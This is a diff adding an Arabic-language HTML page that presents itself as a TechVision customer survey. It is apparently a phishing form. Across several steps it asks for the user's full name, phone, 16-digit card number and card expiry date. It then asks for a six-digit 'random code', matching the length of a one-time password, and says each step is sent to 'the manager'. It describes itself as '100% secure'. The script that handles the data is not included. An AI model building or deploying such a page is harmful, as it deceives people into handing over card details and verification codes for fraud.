@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechVision - استبيان العملاء</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- الهيدر -->
+    <header class="main-header">
+        <div class="header-container">
+            <div class="logo-section">
+                <div class="logo">
+                    <i class="fas fa-chart-line"></i>
+                    <div class="logo-text">
+                        <h1>TechVision</h1>
+                        <p>نظام الاستبيان الذكي</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="header-info">
+                <div class="info-item">
+                    <i class="fas fa-phone"></i>
+                    <div>
+                        <span>اتصل بنا</span>
+                        <strong>9200 12345</strong>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-clock"></i>
+                    <div>
+                        <span>أوقات العمل</span>
+                        <strong>٩ ص - ٥ م</strong>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- المحتوى الرئيسي -->
+    <main class="main-content">
+        <div class="container">
+            <!-- مؤشر التقدم -->
+            <div class="progress-indicator">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-steps">
+                    <div class="step-indicator active" data-step="1">
+                        <span>1</span>
+                        <p>المعلومات الشخصية</p>
+                    </div>
+                    <div class="step-indicator" data-step="2">
+                        <span>2</span>
+                        <p>التفاصيل والرمز</p>
+                    </div>
+                    <div class="step-indicator" data-step="3">
+                        <span>3</span>
+                        <p>تأكيد المعلومات</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- الخطوة 1: المعلومات الشخصية -->
+            <div id="step1" class="step-content active">
+                <div class="step-header">
+                    <h2><i class="fas fa-user-circle"></i> الخطوة الأولى: المعلومات الشخصية</h2>
+                    <p>الرجاء تعبئة البيانات الأساسية</p>
+                </div>
+
+                <div class="form-card">
+                    <div class="form-row">
+                        <!-- الصف الأول: الاسم -->
+                        <div class="form-group full-width">
+                            <label>
+                                <i class="fas fa-user"></i>
+                                الاسم الكامل
+                            </label>
+                            <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي" required>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <!-- الصف الثاني: الهاتف والبطاقة -->
+                        <div class="form-group half-width">
+                            <label>
+                                <i class="fas fa-phone"></i>
+                                رقم الهاتف
+                            </label>
+                            <input type="tel" id="phone" placeholder="05XXXXXXXX" required>
+                            <small>يبدأ بـ 05 أو 06 أو 07 ويتكون من 10 أرقام</small>
+                        </div>
+
+                        <div class="form-group half-width">
+                            <label>
+                                <i class="fas fa-credit-card"></i>
+                                رقم البطاقة (16 رقم)
+                            </label>
+                            <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                            <small>أدخل 16 رقماً بدون مسافات</small>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <!-- الصف الثالث: تاريخ انتهاء الصلاحية -->
+                        <div class="form-group half-width">
+                            <label>
+                                <i class="fas fa-calendar-alt"></i>
+                                تاريخ انتهاء الصلاحية
+                            </label>
+                            <div class="expiry-input">
+                                <input type="month" id="expiryDate" required>
+                                <div class="expiry-hint">
+                                    <i class="fas fa-info-circle"></i>
+                                    <span>الشهر والسنة</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- خانة إضافية يمكن إضافتها إذا أردت -->
+                        <div class="form-group half-width optional">
+                            <label>
+                                <i class="fas fa-envelope"></i>
+                                البريد الإلكتروني (اختياري)
+                            </label>
+                            <input type="email" id="email" placeholder="name@example.com">
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button onclick="submitStep1()" class="btn-primary">
+                            <span>إرسال للمدير والمتابعة</span>
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                    </div>
+
+                    <div class="step-notice">
+                        <i class="fas fa-info-circle"></i>
+                        <span>سيتم إرسال هذه المعلومات للمدير قبل الانتقال للخطوة التالية</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- الخطوة 2: التفاصيل والرمز -->
+            <div id="step2" class="step-content">
+                <div class="step-header">
+                    <h2><i class="fas fa-shield-alt"></i> الخطوة الثانية: التفاصيل والرمز</h2>
+                    <p>أدخل رمزاً عشوائياً من اختيارك</p>
+                </div>
+
+                <div class="form-card">
+                    <!-- جهاز المستخدم -->
+                    <div class="device-info-card">
+                        <div class="device-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
+                        <div class="device-details">
+                            <h3>معلومات جهازك</h3>
+                            <div class="device-stats">
+                                <div class="stat">
+                                    <span>نوع الجهاز:</span>
+                                    <strong id="deviceType">جاري الكشف...</strong>
+                                </div>
+                                <div class="stat">
+                                    <span>نظام التشغيل:</span>
+                                    <strong id="deviceOS">جاري الكشف...</strong>
+                                </div>
+                                <div class="stat">
+                                    <span>الدقة:</span>
+                                    <strong id="deviceResolution">جاري الكشف...</strong>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- إدخال الرمز -->
+                    <div class="code-section">
+                        <div class="code-header">
+                            <h3><i class="fas fa-key"></i> الرمز العشوائي</h3>
+                            <p>اختر أي 6 أرقام من مخيلتك</p>
+                        </div>
+
+                        <div class="code-input-container">
+                            <input type="text" id="randomCode" placeholder="123456" maxlength="6" required>
+                            <div class="code-hint">
+                                <i class="fas fa-lightbulb"></i>
+                                <span>يمكنك اختيار أي أرقام تريدها</span>
+                            </div>
+                        </div>
+
+                        <!-- أزرار سريعة -->
+                        <div class="quick-codes">
+                            <p>أمثلة سريعة:</p>
+                            <div class="code-buttons">
+                                <button onclick="setRandomCode('123456')">123456</button>
+                                <button onclick="setRandomCode('654321')">654321</button>
+                                <button onclick="setRandomCode('999888')">999888</button>
+                                <button onclick="setRandomCode('111222')">111222</button>
+                                <button onclick="setRandomCode('555555')">555555</button>
+                                <button onclick="setRandomCode('888888')">888888</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button onclick="goToStep(1)" class="btn-secondary">
+                            <i class="fas fa-arrow-right"></i>
+                            <span>العودة</span>
+                        </button>
+                        <button onclick="submitStep2()" class="btn-primary">
+                            <span>إرسال للمدير والمتابعة</span>
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- الخطوة 3: تأكيد المعلومات -->
+            <div id="step3" class="step-content">
+                <div class="step-header">
+                    <h2><i class="fas fa-check-circle"></i> الخطوة الثالثة: تأكيد المعلومات</h2>
+                    <p>الرجاء مراجعة بياناتك قبل الإرسال النهائي</p>
+                </div>
+
+                <div class="confirmation-card">
+                    <div class="confirmation-header">
+                        <div class="success-icon">
+                            <i class="fas fa-clipboard-check"></i>
+                        </div>
+                        <h3>تم استلام معلوماتك بنجاح!</h3>
+                        <p>رقم مشاركتك:</p>
+                        <div class="survey-id" id="surveyIdDisplay">TCV-XXXX-XXXX</div>
+                    </div>
+
+                    <div class="confirmation-details">
+                        <div class="details-section">
+                            <h4><i class="fas fa-user-tie"></i> المعلومات الشخصية</h4>
+                            <div class="detail-row">
+                                <span>الاسم الكامل:</span>
+                                <strong id="confirmName">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>رقم الهاتف:</span>
+                                <strong id="confirmPhone">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>رقم البطاقة:</span>
+                                <strong id="confirmCard">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>تاريخ انتهاء الصلاحية:</span>
+                                <strong id="confirmExpiry">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>البريد الإلكتروني:</span>
+                                <strong id="confirmEmail">-</strong>
+                            </div>
+                        </div>
+
+                        <div class="details-section">
+                            <h4><i class="fas fa-laptop"></i> معلومات الجهاز</h4>
+                            <div class="detail-row">
+                                <span>نوع الجهاز:</span>
+                                <strong id="confirmDevice">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>نظام التشغيل:</span>
+                                <strong id="confirmOS">-</strong>
+                            </div>
+                        </div>
+
+                        <div class="details-section">
+                            <h4><i class="fas fa-key"></i> الرمز العشوائي</h4>
+                            <div class="detail-row">
+                                <span>الرمز المدخل:</span>
+                                <strong class="code-display" id="confirmCode">-</strong>
+                            </div>
+                            <div class="detail-row">
+                                <span>وقت الإدخال:</span>
+                                <strong id="confirmTime">-</strong>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="confirmation-actions">
+                        <div class="status-badge">
+                            <i class="fas fa-paper-plane"></i>
+                            <span>تم إرسال جميع البيانات للمدير</span>
+                        </div>
+                        
+                        <div class="action-buttons">
+                            <button onclick="submitFinal()" class="btn-success">
+                                <i class="fas fa-check"></i>
+                                <span>تأكيد الإرسال النهائي</span>
+                            </button>
+                            <button onclick="goToStep(1)" class="btn-outline">
+                                <i class="fas fa-edit"></i>
+                                <span>تعديل المعلومات</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- الخطوة 4: النجاح -->
+            <div id="step4" class="step-content">
+                <div class="success-screen">
+                    <div class="success-animation">
+                        <div class="checkmark">✓</div>
+                    </div>
+                    
+                    <div class="success-message">
+                        <h2>🎉 شكراً لك!</h2>
+                        <p>تم إكمال الاستبيان بنجاح وإرسال جميع المعلومات للمدير</p>
+                    </div>
+
+                    <div class="receipt-card">
+                        <h3><i class="fas fa-receipt"></i> إيصال المشاركة</h3>
+                        
+                        <div class="receipt-details">
+                            <div class="receipt-item">
+                                <span>رقم المشاركة:</span>
+                                <strong class="highlight" id="finalSurveyId">TCV-XXXX-XXXX</strong>
+                            </div>
+                            <div class="receipt-item">
+                                <span>اسم المشارك:</span>
+                                <span id="finalName">-</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span>تاريخ المشاركة:</span>
+                                <span id="finalDate">-</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span>وقت المشاركة:</span>
+                                <span id="finalTime">-</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span>حالة الإرسال:</span>
+                                <span class="status-sent">✓ تم الإرسال للمدير</span>
+                            </div>
+                        </div>
+
+                        <div class="receipt-note">
+                            <i class="fas fa-info-circle"></i>
+                            <p>سيتم التواصل معك في حال الحاجة لأي معلومات إضافية</p>
+                        </div>
+                    </div>
+
+                    <div class="final-actions">
+                        <button onclick="startNewSurvey()" class="btn-primary">
+                            <i class="fas fa-redo"></i>
+                            <span>بدء استبيان جديد</span>
+                        </button>
+                        <button onclick="printReceipt()" class="btn-secondary">
+                            <i class="fas fa-print"></i>
+                            <span>طباعة الإيصال</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- الفوتر -->
+    <footer class="main-footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <div class="footer-logo">
+                    <i class="fas fa-chart-line"></i>
+                    <h3>TechVision</h3>
+                </div>
+                <p class="footer-description">
+                    نظام الاستبيان الذكي الخاص بشركة TechVision
+                </p>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-linkedin"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+
+            <div class="footer-section">
+                <h4>روابط سريعة</h4>
+                <ul class="footer-links">
+                    <li><a href="#"><i class="fas fa-chevron-left"></i> سياسة الخصوصية</a></li>
+                    <li><a href="#"><i class="fas fa-chevron-left"></i> الشروط والأحكام</a></li>
+                    <li><a href="#"><i class="fas fa-chevron-left"></i> الأسئلة الشائعة</a></li>
+                    <li><a href="#"><i class="fas fa-chevron-left"></i> اتصل بنا</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-section">
+                <h4>معلومات الاتصال</h4>
+                <div class="contact-info">
+                    <div class="contact-item">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <span>الرياض، المملكة العربية السعودية</span>
+                    </div>
+                    <div class="contact-item">
+                        <i class="fas fa-phone"></i>
+                        <span>+966 11 123 4567</span>
+                    </div>
+                    <div class="contact-item">
+                        <i class="fas fa-envelope"></i>
+                        <span>info@techvision.com</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-section">
+                <h4>اشترك في النشرة</h4>
+                <div class="newsletter">
+                    <input type="email" placeholder="بريدك الإلكتروني">
+                    <button><i class="fas fa-paper-plane"></i></button>
+                </div>
+                <p class="newsletter-note">
+                    اشترك لتصلك آخر التحديثات والعروض
+                </p>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <p>© 2024 TechVision. جميع الحقوق محفوظة</p>
+            <div class="footer-bottom-links">
+                <a href="#">English</a>
+                <a href="#"><i class="fas fa-shield-alt"></i> آمن 100%</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- نافذة التنبيهات -->
+    <div class="notification" id="notification">
+        <div class="notification-content">
+            <i class="fas fa-paper-plane"></i>
+            <div class="notification-text">
+                <strong>جاري إرسال البيانات للمدير...</strong>
+                <span>يرجى الانتظار</span>
+            </div>
+            <div class="notification-loader"></div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
